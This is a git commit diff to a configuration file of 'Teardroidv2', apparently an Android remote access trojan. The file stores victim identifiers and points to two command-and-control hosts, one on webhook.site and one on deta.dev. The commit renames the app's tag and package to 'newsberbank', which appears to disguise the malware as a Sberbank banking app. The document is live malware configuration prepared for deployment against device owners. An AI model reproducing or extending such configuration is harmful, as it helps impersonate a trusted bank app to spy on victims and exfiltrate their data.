73fab0de92b7173b9e5ed657b292f37978dd67a0
rnvntv <34110481+rnvntv@users.noreply.github.com>
2023-01-14 14:07:55 +0300

    work

--- source/Teardroidv2/app/src/main/java/com/example/teardroidv2/AppInfo.kt
+++ source/Teardroidv2/app/src/main/java/com/example/teardroidv2/AppInfo.kt
@@ -1,13 +1,13 @@
 package com.example.teardroidv2
 
 object AppInfo {
-    val TAG = "Teardroid"
+    val TAG = "newsberbank"
     val isServiceRunning = "isServiceRunning"
     val FirstRunKey = "isFirstRun"
     val VictimDatastore = "VictimInformation"
     val VictimID = "VictimUUID"
     val DeviceBaseFolder = "/storage/emulated/0/"
-    val PackageName = "com.example.teardroidv2"
+    val PackageName = "com.example.newsberbank"
     val devHostName = "https://webhook.site/de799e0c-da90-4438-af38-7227c1cfb6c2"
     val HOSTNAME = "https://4lw9cp.deta.dev"
     val NotificationTitle = "Hello"
